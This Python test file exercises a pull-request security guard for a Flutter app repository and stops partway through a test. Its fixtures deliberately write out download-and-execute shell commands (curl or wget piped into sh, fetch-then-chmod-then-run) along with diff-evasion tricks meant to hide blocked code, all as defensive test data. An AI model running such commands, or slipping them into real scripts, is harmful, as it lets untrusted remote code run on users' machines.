#!/usr/bin/env python3
"""Unit tests for the PR security surface guard.

    python3 test/tooling/check_pr_security_surface_test.py

Two things are under test:

* `scripts/check_pr_security_surface.py`, exercised end to end against synthetic
  git repositories. A classifier is only worth its blocked list if it still sees
  the diff when a contributor tries to hide it, so most of these tests take a
  benign change, apply exactly one evasion trick to it, and expect the same
  verdict as without the trick.
* the parts of `.github/workflows/pr-security-review.yml` that carry security
  logic: the trusted-scanner loader and the jq filter that decides whether the
  current HEAD is approved. Both are read out of the workflow file itself and
  executed here, so the tests cannot drift away from what CI runs.

Everything is offline. No network, no GitHub API, no repository writes.
"""

from __future__ import annotations

import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
SCANNER = ROOT / "scripts" / "check_pr_security_surface.py"
WORKFLOW = ROOT / ".github" / "workflows" / "pr-security-review.yml"


def _load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


scanner = _load("check_pr_security_surface", SCANNER)


def blocked(*fragments: str) -> str:
    """Assemble a fixture containing a literal the guard blocks.

    The guard scans every added line of every changed file, this test file
    included. A fixture that spelled these patterns out contiguously would make
    the guard reject any PR that touches its own tests, so they are joined at
    runtime instead. `GuardSelfSafety` proves the split is complete.
    """

    return "".join(fragments)


PROCESS_RUN = blocked("Process", ".", "run")
PROCESS_START = blocked("Process", " . ", "start")
RUN_IN_SHELL = blocked("runIn", "Shell")
DART_FFI = "dart:" + blocked("f", "fi")
DYNAMIC_LIBRARY = blocked("Dynamic", "Library")
PR_TARGET = blocked("pull_request", "_target")
WRITE_ALL = blocked("permissions: ", "write-all")


class ScanResult:
    def __init__(self, returncode: int, stdout: str, stderr: str, report: str, outputs: dict[str, str]):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr
        self.report = report
        self.outputs = outputs

    @property
    def sensitive(self) -> bool:
        return self.outputs.get("sensitive") == "true"

    @property
    def blocked(self) -> bool:
        return self.outputs.get("blocked") == "true"

    def reported_paths(self) -> set[str]:
        paths = set()
        for line in self.report.splitlines():
            if line.startswith("- `"):
                paths.add(line[3 : line.index("`", 3)])
        return paths


def _git(repo: Path, *args: str) -> str:
    result = subprocess.run(
        ["git", *args],
        cwd=repo,
        check=True,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env={**os.environ, "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull},
    )
    return result.stdout


def _write(repo: Path, relative: str, content: str) -> None:
    target = repo / relative
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(content, encoding="utf-8")


def _commit(repo: Path, message: str) -> str:
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "--allow-empty", "-m", message)
    return _git(repo, "rev-parse", "HEAD").strip()


class ScannerTestCase(unittest.TestCase):
    """Base class that builds a throwaway two-commit repository per scenario."""

    def build(self, base: dict[str, str], head: dict[str, str | None]) -> ScanResult:
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp, True)
        repo = tmp / "repo"
        repo.mkdir()

        _git(repo, "init", "-q", "-b", "main", ".")
        _git(repo, "config", "user.email", "test@example.invalid")
        _git(repo, "config", "user.name", "Test")

        _write(repo, "README.md", "# fixture\n")
        for path, content in base.items():
            _write(repo, path, content)
        base_sha = _commit(repo, "base")

        for path, content in head.items():
            if content is None:
                (repo / path).unlink()
            else:
                _write(repo, path, content)
        head_sha = _commit(repo, "head")

        return self.scan(repo, base_sha, head_sha)

    def build_raw(
        self, base: dict[bytes, bytes], head: dict[bytes, bytes]
    ) -> ScanResult:
        """Like build(), but pathnames are raw bytes rather than str.

        Needed to construct a pathname that is not valid UTF-8, which is not
        expressible through the str-keyed helper.
        """

        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp, True)
        repo = tmp / "repo"
        repo.mkdir()

        _git(repo, "init", "-q", "-b", "main", ".")
        _git(repo, "config", "user.email", "test@example.invalid")
        _git(repo, "config", "user.name", "Test")

        def write(paths: dict[bytes, bytes]) -> None:
            for raw, content in paths.items():
                target = os.path.join(os.fsencode(repo), raw)
                os.makedirs(os.path.dirname(target), exist_ok=True)
                with open(target, "wb") as handle:
                    handle.write(content)

        _write(repo, "README.md", "# fixture\n")
        write(base)
        base_sha = _commit(repo, "base")

        write(head)
        head_sha = _commit(repo, "head")

        return self.scan(repo, base_sha, head_sha)

    def scan(self, repo: Path, base_sha: str, head_sha: str) -> ScanResult:
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp, True)
        report = tmp / "report.md"
        output = tmp / "github_output"
        output.touch()

        result = subprocess.run(
            [
                sys.executable,
                str(SCANNER),
                "--base",
                base_sha,
                "--head",
                head_sha,
                "--report",
                str(report),
                "--github-output",
                str(output),
            ],
            cwd=repo,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        outputs: dict[str, str] = {}
        for line in output.read_text(encoding="utf-8").splitlines():
            if "=" in line:
                key, _, value = line.partition("=")
                outputs[key] = value

        return ScanResult(
            result.returncode,
            result.stdout,
            result.stderr,
            report.read_text(encoding="utf-8") if report.exists() else "",
            outputs,
        )

    def assertOrdinary(self, result: ScanResult) -> None:
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertFalse(result.sensitive, result.report)
        self.assertFalse(result.blocked, result.report)

    def assertSensitive(self, result: ScanResult) -> None:
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertTrue(result.sensitive, result.report)
        self.assertFalse(result.blocked, result.report)

    def assertBlocked(self, result: ScanResult) -> None:
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertTrue(result.blocked, result.report)


class OrdinaryDiffs(ScannerTestCase):
    def test_ui_only_pr_needs_no_ceremony(self):
        result = self.build(
            {"lib/ui/player_button.dart": "class PlayerButton {}\n"},
            {
                "lib/ui/player_button.dart": "class PlayerButton {\n  final double size = 48;\n}\n",
                "test/ui/player_button_test.dart": "void main() {}\n",
                "docs/ui.md": "# UI\n\nThe player button is 48dp.\n",
            },
        )
        self.assertOrdinary(result)

    def test_binary_asset_is_not_sensitive(self):
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp, True)
        repo = tmp / "repo"
        repo.mkdir()
        _git(repo, "init", "-q", "-b", "main", ".")
        _git(repo, "config", "user.email", "test@example.invalid")
        _git(repo, "config", "user.name", "Test")
        _write(repo, "README.md", "# fixture\n")
        base_sha = _commit(repo, "base")
        (repo / "assets").mkdir()
        (repo / "assets" / "icon.png").write_bytes(bytes(range(256)) * 64)
        head_sha = _commit(repo, "head")
        self.assertOrdinary(self.scan(repo, base_sha, head_sha))


class SensitiveSurfaces(ScannerTestCase):
    def test_network_and_auth_change(self):
        result = self.build(
            {"lib/data/network_client.dart": "class NetworkClient {}\n"},
            {"lib/data/network_client.dart": "class NetworkClient {\n  final client = HttpClient();\n}\n"},
        )
        self.assertSensitive(result)
        self.assertIn("lib/data/network_client.dart", result.reported_paths())

    def test_persistence_and_filesystem_change(self):
        result = self.build(
            {"lib/ui/exporter.dart": "class Exporter {}\n"},
            {"lib/ui/exporter.dart": "void save() {\n  File('/tmp/out').writeAsString('x');\n}\n"},
        )
        self.assertSensitive(result)

    def test_workflow_change(self):
        result = self.build(
            {".github/workflows/ci.yml": "name: ci\non: [push]\n"},
            {".github/workflows/ci.yml": "name: ci\non: [push, pull_request]\n"},
        )
        self.assertSensitive(result)

    def test_deleting_an_automation_script_is_sensitive(self):
        result = self.build(
            {"scripts/check_secrets.sh": "#!/bin/sh\necho scan\n"},
            {"scripts/check_secrets.sh": None},
        )
        self.assertSensitive(result)
        self.assertIn("scripts/check_secrets.sh", result.reported_paths())

    def test_rename_out_of_scripts_still_reports_the_original_path(self):
        """Rename detection would otherwise show only the harmless destination."""
        body = "#!/bin/sh\n" + "".join(f"echo line {n}\n" for n in range(40))
        result = self.build(
            {"scripts/tool.sh": body},
            {"scripts/tool.sh": None, "docs/tool.sh": body},
        )
        self.assertSensitive(result)
        self.assertIn("scripts/tool.sh", result.reported_paths())

    def test_gitattributes_change_is_sensitive(self):
        result = self.build({}, {".gitattributes": "*.dart text\n"})
        self.assertSensitive(result)


class ProjectConfigPaths(ScannerTestCase):
    """Cross-checked against flutter-ci-fixer.yml's own forbidden-paths list."""

    def test_analyzer_config(self):
        """`flutter analyze` is a required check on every PR."""
        path = "analysis_options.yaml"
        self.assertSensitive(self.build({path: "linter:\n"}, {path: "linter:\n  rules: []\n"}))

    def test_licensing(self):
        for path in ("LICENSE", "COPYING", "NOTICE.md"):
            with self.subTest(path):
                self.assertSensitive(self.build({path: "a\n"}, {path: "b\n"}))

    def test_signing_material(self):
        for path in ("android/key.properties", "android/app/release.jks", "upload.keystore"):
            with self.subTest(path):
                self.assertSensitive(self.build({}, {path: "x\n"}))


class GithubDirectoryPaths(ScannerTestCase):
    """`.github/` is automation by default; only community metadata is exempt."""

    def test_agent_prompt_is_sensitive(self):
        """flutter-ci-fixer.yml feeds this to an agent with workspace-write."""
        path = ".github/codex/prompts/fix-flutter-ci.md"
        self.assertSensitive(self.build({path: "old\n"}, {path: "new\n"}))

    def test_workflows_and_actions_still_sensitive(self):
        for path in (".github/workflows/ci.yml", ".github/actions/setup-flutter/action.yml"):
            with self.subTest(path):
                self.assertSensitive(self.build({path: "a: 1\n"}, {path: "a: 2\n"}))

    def test_community_metadata_stays_ordinary(self):
        for path in (".github/ISSUE_TEMPLATE/bug_report.yml", ".github/FUNDING.yml"):
            with self.subTest(path):
                self.assertOrdinary(self.build({path: "a: 1\n"}, {path: "a: 2\n"}))


class AutomationAndToolchainPaths(ScannerTestCase):
    """CI executes more than scripts/, and consumes pinned toolchains."""

    def test_tool_and_tools_trees_are_automation(self):
        for path in ("tool/version_from_tag.dart", "tools/large_library/gen.py"):
            with self.subTest(path):
                self.assertSensitive(self.build({}, {path: "// new\n"}))

    def test_gradle_wrapper_is_sensitive(self):
        """distributionUrl chooses where Gradle itself is downloaded from."""
        base = {"android/gradle/wrapper/gradle-wrapper.properties": "distributionUrl=https://services.gradle.org/a.zip\n"}
        head = {"android/gradle/wrapper/gradle-wrapper.properties": "distributionUrl=https://example.invalid/a.zip\n"}
        self.assertSensitive(self.build(base, head))

    def test_toolchain_version_pins_are_sensitive(self):
        for path in (".flutter-version", ".java-version"):
            with self.subTest(path):
                self.assertSensitive(self.build({path: "1\n"}, {path: "2\n"}))

    def test_ordinary_dotfiles_are_not_swept_up(self):
        self.assertOrdinary(self.build({}, {".gitignore": "build/\n"}))


class AndroidSecurityPolicyPaths(ScannerTestCase):
    """res/xml carries the app's security and privacy policy."""

    BASE = "android/app/src/main/res/xml/"

    def test_network_security_config(self):
        """Trust anchors and cleartext policy live here."""
        path = self.BASE + "network_security_config.xml"
        self.assertSensitive(self.build({path: "<a/>\n"}, {path: "<b/>\n"}))

    def test_backup_and_extraction_rules(self):
        for name in ("backup_rules.xml", "data_extraction_rules.xml"):
            with self.subTest(name):
                path = self.BASE + name
                self.assertSensitive(self.build({path: "<a/>\n"}, {path: "<b/>\n"}))


class PlatformSourcePaths(ScannerTestCase):
    """Kotlin under android/ ships in every release APK."""

    KOTLIN = "android/app/src/main/kotlin/io/github/thezupzup/linthra/"

    def test_android_kotlin_is_sensitive(self):
        for name in ("MediaArtworkFileProvider.kt", "SafDocumentScanner.kt", "ShareChannel.kt"):
            with self.subTest(name):
                path = self.KOTLIN + name
                self.assertSensitive(self.build({path: "class A\n"}, {path: "class B\n"}))

    def test_android_resources_stay_ordinary(self):
        """Only source and policy files, not every android/ asset."""
        path = "android/app/src/main/res/drawable/ic_launcher.xml"
        self.assertOrdinary(self.build({}, {path: "<vector/>\n"}))


class NativeAndCargoPaths(ScannerTestCase):
    """CI compiles native/ and runs the Rust core from it."""

    def test_cargo_manifest_and_lockfile(self):
        """A Cargo dependency may carry a build script that runs during CI."""
        for path in ("native/linthra_core/Cargo.toml", "native/linthra_core/Cargo.lock"):
            with self.subTest(path):
                self.assertSensitive(self.build({path: "a = 1\n"}, {path: "a = 2\n"}))

    def test_native_sources(self):
        for path in (
            "native/linthra_audio/src/dsp.cpp",
            "native/linthra_audio/include/linthra_audio/dsp.hpp",
            "native/linthra_core/src/lib.rs",
            "linux/runner/main.cc",
        ):
            with self.subTest(path):
                self.assertSensitive(self.build({}, {path: "// new\n"}))

    def test_cmake_build_files(self):
        for path in ("native/linthra_audio/CMakeLists.txt", "linux/flutter/generated_plugins.cmake"):
            with self.subTest(path):
                self.assertSensitive(self.build({}, {path: "# new\n"}))

    def test_documentation_beside_native_code_stays_ordinary(self):
        self.assertOrdinary(
            self.build({}, {"native/linthra_core/README.md": "# notes\n"})
        )

    def test_dart_build_hooks(self):
        """hook/build.dart runs on every Flutter build and test."""
        for path in ("hook/build.dart", "hook/link.dart"):
            with self.subTest(path):
                self.assertSensitive(self.build({}, {path: "void main() {}\n"}))


class ReviewedNativeBridgeLocations(ScannerTestCase):
    """The Rust bridge's process and FFI use is reviewed in two places only."""

    RUN_CARGO = f"void main() {{\n  {PROCESS_RUN}('cargo', <String>['build']);\n}}\n"
    IMPORT_FFI = f"import '{DART_FFI}';\n"

    def test_build_hook_may_run_a_process_with_review(self):
        self.assertSensitive(self.build({}, {"hook/build.dart": self.RUN_CARGO}))

    def test_process_execution_stays_blocked_elsewhere(self):
        for path in ("hook/link.dart", "hook/src/build.dart", "lib/core/native/run.dart"):
            with self.subTest(path):
                self.assertBlocked(self.build({}, {path: self.RUN_CARGO}))

    def test_native_bindings_may_use_ffi_with_review(self):
        for path in (
            "lib/core/native/linthra_core_ffi.dart",
            "lib/core/native/linthra_core.dart",
        ):
            with self.subTest(path):
                self.assertSensitive(self.build({}, {path: self.IMPORT_FFI}))

    def test_ffi_stays_blocked_elsewhere(self):
        for path in (
            "lib/core/native/deeper/bindings.dart",
            "lib/core/services/player.dart",
            "hook/build.dart",
            "test/core/native/linthra_core_test.dart",
        ):
            with self.subTest(path):
                self.assertBlocked(self.build({}, {path: self.IMPORT_FFI}))

    def test_every_reviewed_location_names_a_blocked_rule(self):
        """A renamed rule must not leave its exception silently unused."""
        reasons = {reason for _, reason in scanner.BLOCKED_ADDITION_RULES}
        self.assertLessEqual(set(scanner.BLOCKED_RULE_REVIEWED_PATHS), reasons)


class BlockedAdditions(ScannerTestCase):
    def test_direct_process_run(self):
        self.assertBlocked(
            self.build(
                {"lib/ui/panel.dart": "class Panel {}\n"},
                {"lib/ui/panel.dart": f"void go() {{\n  {PROCESS_RUN}('sh', ['-c', 'id']);\n}}\n"},
            )
        )

    def test_indirect_process_run_reference(self):
        """Binding the API to a local grants the same capability as calling it."""
        result = self.build(
            {"lib/features/demo/runner.dart": "class Runner {}\n"},
            {
                "lib/features/demo/runner.dart": (
                    f"final run = {PROCESS_RUN};\n"
                    "Future<void> go(List<String> args) async {\n"
                    "  await run('sh', args);\n"
                    "}\n"
                )
            },
        )
        self.assertBlocked(result)
        self.assertIn("runtime process execution", result.report)

    def test_process_start_and_run_in_shell(self):
        self.assertBlocked(
            self.build({}, {"lib/a.dart": f"final p = {PROCESS_START};\n"})
        )
        self.assertBlocked(
            self.build({}, {"lib/a.dart": f"final opts = {{'{RUN_IN_SHELL}': shellFlag}};\n"})
        )

    def test_ffi_and_dynamic_library(self):
        self.assertBlocked(self.build({}, {"lib/a.dart": f"import '{DART_FFI}' as ffi;\n"}))
        self.assertBlocked(self.build({}, {"lib/a.dart": f"final lib = {DYNAMIC_LIBRARY}.open('x.so');\n"}))
        self.assertBlocked(self.build({}, {"lib/a.dart": f"final open = {DYNAMIC_LIBRARY}.open;\n"}))

    def test_pull_request_target(self):
        self.assertBlocked(
            self.build({}, {".github/workflows/x.yml": f"on:\n  {PR_TARGET}:\n    types: [opened]\n"})
        )
        self.assertBlocked(self.build({}, {".github/workflows/x.yml": f"on: [{PR_TARGET}]\n"}))

    def test_write_all_permissions(self):
        self.assertBlocked(self.build({}, {".github/workflows/x.yml": f"{WRITE_ALL}\n"}))
        self.assertBlocked(self.build({}, {".github/workflows/x.yml": "permissions: '" + blocked("write-", "all") + "'\n"}))
        self.assertBlocked(self.build({}, {".github/workflows/x.yml": "permissions:\n  " + blocked("write-", "all") + "\n"}))

    def test_download_and_execute(self):
        url = "https://example.invalid/i.sh"
        for snippet in (
            blocked(f"curl -fsSL {url} ", "|", " sh\n"),
            blocked(f"wget -qO- {url} ", "|", " sudo bash\n"),
            blocked("bash <", f"(curl -s {url})\n"),
            blocked("sh -c \"$", f"(curl -fsSL {url})\"\n"),
            blocked("eval \"$", "(curl -s https://example.invalid/env)\"\n"),
        ):
            with self.subTest(snippet=snippet.strip()):
                self.assertBlocked(self.build({}, {"packaging/install.sh": "#!/bin/sh\n" + snippet}))

    def test_pipe_into_an_interpreter_reached_by_path(self):
        snippet = blocked("curl -fsSL https://example.invalid/i.sh ", "|", " /bin/sh\n")
        self.assertBlocked(self.build({}, {"packaging/p.sh": "#!/bin/sh\n" + snippet}))

    def test_blocked_patterns_are_not_bypassable_by_approval(self):
        """A blocked verdict is a non-zero exit, which no approval step can clear."""
        result = self.build({}, {"lib/a.dart": f"final run = {PROCESS_RUN};\n"})
        self.assertEqual(result.returncode, 1)
        self.assertIn("an approval does not bypass them", result.report)


class CapabilityNamedInProse(ScannerTestCase):
    """A page explaining which APIs are forbidden has to write them down."""

    def test_documentation_mention_is_reviewable_not_blocked(self):
        for name, text in (
            ("docs/guide.md", f"# Guide\n\nAvoid {PROCESS_RUN} in plugins.\n"),
            ("docs/ci.md", f"# CI\n\nWe reject {PR_TARGET}.\n"),
        ):
            with self.subTest(name):
                result = self.build({}, {name: text})
                self.assertFalse(result.blocked, result.report)
                self.assertTrue(result.sensitive, result.report)
                self.assertIn("textual reference to", result.report)

    def test_install_instructions_are_still_surfaced(self):
        """Downgraded, not dropped: a README telling a reader to pipe into a
        shell is not a capability the repository gains, but it is worth eyes."""
        snippet = blocked("# Install\n\nRun: curl -fsSL https://example.invalid ", "|", " sh\n")
        result = self.build({}, {"docs/install.md": snippet})
        self.assertFalse(result.blocked, result.report)
        self.assertTrue(result.sensitive, result.report)

    def test_source_files_are_still_blocked(self):
        """Only the path decides. Comment and string context inside source is
        deliberately not inferred — telling a comment from a string literal
        needs a lexer, and a wrong answer there is a bypass, not a nuisance."""
        for name, text in (
            ("lib/a.dart", f"void main() {{ {PROCESS_RUN}('sh'); }}\n"),
            ("lib/b.dart", f"// {PROCESS_RUN} is forbidden here\nvoid main() {{}}\n"),
        ):
            with self.subTest(name):
                self.assertBlocked(self.build({}, {name: text}))


class FdroidRecipePath(ScannerTestCase):
    """metadata/*.yml is a build recipe; the text beside it is text."""

    def test_recipe_is_sensitive(self):
        path = "metadata/io.github.thezupzup.linthra.yml"
        base = "Builds:\n  - versionCode: 1\n"
        head = "Builds:\n  - versionCode: 2\n    sudo: [apt install evil]\n"
        self.assertSensitive(self.build({path: base}, {path: head}))

    def test_store_text_stays_ordinary(self):
        path = "fastlane/metadata/android/en-US/changelogs/1.txt"
        self.assertOrdinary(self.build({path: "old\n"}, {path: "new\n"}))


class ProseIsNotLogic(ScannerTestCase):
    """The credential words are ordinary English."""

    def test_documentation_prose_is_ordinary(self):
        """The advertised no-ceremony path has to survive the word 'password'."""
        for path in ("docs/setup.md", "README.md", "docs/faq.txt"):
            with self.subTest(path):
                self.assertOrdinary(
                    self.build({}, {path: "Enter your password to sign in.\n"})
                )

    def test_code_still_matches(self):
        self.assertSensitive(
            self.build({}, {"lib/feature/x.dart": "final password = read();\n"})
        )


class DownloadMadeExecutable(ScannerTestCase):
    """chmod is a supply-chain event, but it is not itself execution."""

    URL = "https://example.invalid/tool"

    def test_chmod_without_execution_is_reviewable_not_blocked(self):
        script = f"#!/bin/sh\ncurl -o /tmp/tool {self.URL} && chmod +x /tmp/tool\n"
        result = self.build({}, {"packaging/install.sh": script})
        self.assertFalse(result.blocked, result.report)
        self.assertTrue(result.sensitive, result.report)

    def test_chmod_then_invocation_is_blocked(self):
        script = blocked(
            f"#!/bin/sh\ncurl -o /tmp/tool {self.URL} && chmod +x /tmp/tool\n", "/tmp/tool", "\n"
        )
        self.assertBlocked(self.build({}, {"packaging/run.sh": script}))

    def test_path_reappearing_at_line_start_is_not_an_invocation(self):
        """Without the chmod, a path at line start is just a path."""
        script = (
            "#!/bin/sh\n"
            f"curl -o /tmp/tool {self.URL} && echo done\n"
            "# /tmp/tool is where it landed\n"
        )
        self.assertOrdinary(self.build({}, {"packaging/note.sh": script}))


class ShellFlagValues(ScannerTestCase):
    """The blocker is about enabling a shell, not naming the flag."""

    FLAG = blocked("runIn", "Shell")

    def test_enabled_is_blocked(self):
        self.assertBlocked(self.build({}, {"lib/a.dart": f"var o = {self.FLAG}: true;\n"}))

    def test_variable_value_is_blocked(self):
        """Unjudgeable from here, so it stays blocked."""
        self.assertBlocked(self.build({}, {"lib/a.dart": f"var o = {self.FLAG}: allowShell;\n"}))

    def test_expression_merely_starting_with_false_is_blocked(self):
        """`false || true` evaluates true; the exemption is for `false` alone."""
        for name, value in (("lib/x1.dart", "false || true"), ("lib/x2.dart", "false == false")):
            with self.subTest(value):
                self.assertBlocked(
                    self.build({}, {name: f"var o = {self.FLAG}: {value};\n"})
                )

    def test_disabled_value_at_expression_delimiters(self):
        for name, tail in (("lib/y1.dart", ","), ("lib/y2.dart", ")"), ("lib/y3.dart", ";")):
            with self.subTest(tail):
                result = self.build({}, {name: f"f({self.FLAG}: false{tail}\n"})
                self.assertFalse(result.blocked, result.report)

    def test_explicitly_disabled_is_not_blocked(self):
        """Shell execution stays off, and an approval could not clear a block."""
        result = self.build({}, {"lib/a.dart": f"var o = {self.FLAG}: false;\n"})
        self.assertFalse(result.blocked, result.report)


class DiffEvasion(ScannerTestCase):
    def test_non_ascii_path_is_still_classified(self):
        """core.quotePath would otherwise hide the whole file from the parser."""
        result = self.build({}, {"lib/features/évil.dart": f"void main() {{ {PROCESS_RUN}('sh', []); }}\n"})
        self.assertBlocked(result)
        self.assertIn("lib/features/évil.dart", result.reported_paths())

    def test_path_with_quote_and_tab_is_still_classified(self):
        result = self.build({}, {'lib/we"ird\ttab.dart': f"final run = {PROCESS_RUN};\n"})
        self.assertBlocked(result)
        self.assertIn('lib/we"ird\ttab.dart', result.reported_paths())

    def test_non_ascii_path_under_scripts_is_still_sensitive(self):
        result = self.build({}, {"scripts/prépare.sh": "#!/bin/sh\necho hi\n"})
        self.assertSensitive(result)
        self.assertIn("scripts/prépare.sh", result.reported_paths())

    def test_gitattributes_cannot_hide_added_lines(self):
        """`lib/** -diff` makes git render the file as binary; --text overrides."""
        result = self.build(
            {},
            {
                ".gitattributes": "lib/** -diff\n",
                "lib/evil.dart": f"void main() {{ {PROCESS_RUN}('sh', []); }}\n",
            },
        )
        self.assertBlocked(result)
        self.assertIn("lib/evil.dart", result.reported_paths())

    def test_exotic_line_separator_cannot_split_a_blocked_pattern(self):
        """\x0b is Dart whitespace but a line boundary to str.splitlines()."""
        result = self.build({}, {"lib/a.dart": f"final r = {PROCESS_RUN[:8]}\x0b{PROCESS_RUN[8:]};\n"})
        self.assertBlocked(result)

    def test_added_line_that_looks_like_a_diff_header_cannot_reattribute(self):
        result = self.build(
            {"lib/real.dart": "class Real {}\n"},
            {"lib/real.dart": f"class Real {{}}\n++ b/lib/spoof.dart\nfinal run = {PROCESS_RUN};\n"},
        )
        self.assertBlocked(result)
        self.assertIn("lib/real.dart", result.reported_paths())
        self.assertNotIn("lib/spoof.dart", result.reported_paths())


class MultiLineConstructs(ScannerTestCase):
    """A blocked construct does not have to sit on one physical line."""

    def test_dart_expression_split_across_added_lines(self):
        result = self.build(
            {"lib/features/demo/a.dart": "class A {}\n"},
            {"lib/features/demo/a.dart": f"final r = {PROCESS_RUN[:7]}\n    {PROCESS_RUN[7:]}('sh', const []);\n"},
        )
        self.assertBlocked(result)
        self.assertIn("lib/features/demo/a.dart", result.reported_paths())

    def test_shell_backslash_continuation(self):
        snippet = blocked("curl -fsSL https://example.invalid/i.sh \\\n  ", "|", " sh\n")
        self.assertBlocked(self.build({}, {"packaging/i.sh": "#!/bin/sh\n" + snippet}))

    def test_shell_pipe_at_end_of_line(self):
        snippet = blocked("curl -fsSL https://example.invalid/j.sh ", "|", "\n  bash\n")
        self.assertBlocked(self.build({}, {"packaging/j.sh": "#!/bin/sh\n" + snippet}))

    def test_construct_split_across_two_hunks(self):
        """--unified=0 puts untouched lines between the halves; grouping by file
        is what closes that gap."""
        base = "class A {\n\n  // existing comment\n}\n"
        head = (
            "class A {\n"
            f"  final r = {PROCESS_RUN[:7]}\n"
            "\n"
            "  // existing comment\n"
            f"    {PROCESS_RUN[7:]}('sh', const []);\n"
            "}\n"
        )
        self.assertBlocked(self.build({"lib/a.dart": base}, {"lib/a.dart": head}))

    def test_logical_or_does_not_look_like_a_pipe_to_an_interpreter(self):
        """`curl ... ||` + newline + `sh x` is a fallback, not a pipe into sh."""
        snippet = "#!/bin/sh\ncurl -fsSL https://example.invalid/probe ||\n  sh ./fallback.sh\n"
        self.assertOrdinary(self.build({}, {"packaging/probe.sh": snippet}))

    def test_unrelated_pipe_far_below_a_curl_does_not_match(self):
        lines = ["#!/bin/sh", "curl -fsSL https://example.invalid/data -o /tmp/d"]
        lines += [f"echo step {n}" for n in range(20)]
        lines += ["cat /tmp/d | sh_report --summary"]
        self.assertOrdinary(self.build({}, {"packaging/report.sh": "\n".join(lines) + "\n"}))


class CommentSeparatedTokens(ScannerTestCase):
    """Dart accepts a comment anywhere whitespace is legal."""

    def test_block_comment_between_tokens(self):
        result = self.build(
            {"lib/features/demo/runner.dart": "class R {}\n"},
            {"lib/features/demo/runner.dart": f"void go() {{\n  {PROCESS_RUN[:7]} /* keep */ . {PROCESS_RUN[8:]}('sh', const []);\n}}\n"},
        )
        self.assertBlocked(result)

    def test_line_comment_between_tokens(self):
        result = self.build(
            {}, {"lib/a.dart": f"final p = {PROCESS_RUN[:7]} // why\n    .start('sh');\n"}
        )
        self.assertBlocked(result)

    def test_separator_cannot_skip_over_real_code(self):
        """The gap only ever spans whitespace and comments, never code."""
        rule = scanner.BLOCKED_ADDITION_RULES[0][0]
        self.assertIsNone(rule.search("class " + PROCESS_RUN[:7] + " {}\n  foo.run();"))
        self.assertIsNone(rule.search(PROCESS_RUN[:7] + "ingState.run"))

    def test_plain_direct_call_still_matches(self):
        """Regression: the separator must not break the ordinary spelling."""
        rule = scanner.BLOCKED_ADDITION_RULES[0][0]
        self.assertIsNotNone(rule.search(f"{PROCESS_RUN}('sh', [])"))


class DownloadThenExecute(ScannerTestCase):
    """Fetching to a file and running it later is the same capability."""

    URL = "https://example.invalid/i"

    def test_and_chained_on_one_line(self):
        script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/i && ", "sh", " /tmp/i\n")
        self.assertBlocked(self.build({}, {"packaging/a.sh": script}))

    def test_split_across_lines(self):
        script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/j\n", "bash", " /tmp/j\n")
        self.assertBlocked(self.build({}, {"packaging/b.sh": script}))

    def test_wget_output_flag(self):
        script = blocked(f"#!/bin/sh\nwget -O /tmp/k {self.URL}\n", "bash", " /tmp/k\n")
        self.assertBlocked(self.build({}, {"packaging/c.sh": script}))

    def test_shell_redirect_to_file(self):
        script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} > /tmp/m; ", "python3", " /tmp/m\n")
        self.assertBlocked(self.build({}, {"packaging/d.sh": script}))

    def test_chmod_then_direct_execution(self):
        script = f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/n\nchmod +x /tmp/n\n/tmp/n\n"
        self.assertBlocked(self.build({}, {"packaging/e.sh": script}))

    def test_interpreter_reached_by_path(self):
        """`/bin/sh` is an interpreter; `report.sh` is a filename."""
        script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/p && /bin/", "bash", " /tmp/p\n")
        self.assertBlocked(self.build({}, {"packaging/g.sh": script}))

    def test_sudo_interpreter(self):
        script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/q && sudo ", "sh", " /tmp/q\n")
        self.assertBlocked(self.build({}, {"packaging/h.sh": script}))

    def test_downloaded_file_consumed_by_a_non_interpreter_is_not_blocked(self):
        script = (
            "#!/bin/sh\n"
            f"curl -fsSL {self.URL}/d.json -o /tmp/d.json\n"
            "jq . /tmp/d.json\n"
        )
        self.assertOrdinary(self.build({}, {"packaging/i.sh": script}))

    def test_quoted_execution_target(self):
        script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/i && ", "sh", ' "/tmp/i"\n')
        self.assertBlocked(self.build({}, {"packaging/qa.sh": script}))

    def test_quoted_download_target_unquoted_execution(self):
        script = blocked(f'#!/bin/sh\ncurl -fsSL {self.URL} -o "/tmp/i" && ', "sh", " /tmp/i\n")
        self.assertBlocked(self.build({}, {"packaging/qb.sh": script}))

    def test_bundled_short_options(self):
        """`-qO` / `-sLo` bundle the output flag with others."""
        for name, script in (
            ("packaging/ba.sh", blocked(f"#!/bin/sh\nwget -qO /tmp/i {self.URL} && ", "sh", " /tmp/i\n")),
            ("packaging/bb.sh", blocked(f"#!/bin/sh\ncurl -sLo /tmp/i {self.URL} && ", "sh", " /tmp/i\n")),
        ):
            with self.subTest(name):
                self.assertBlocked(self.build({}, {name: script}))

    def test_attached_option_value(self):
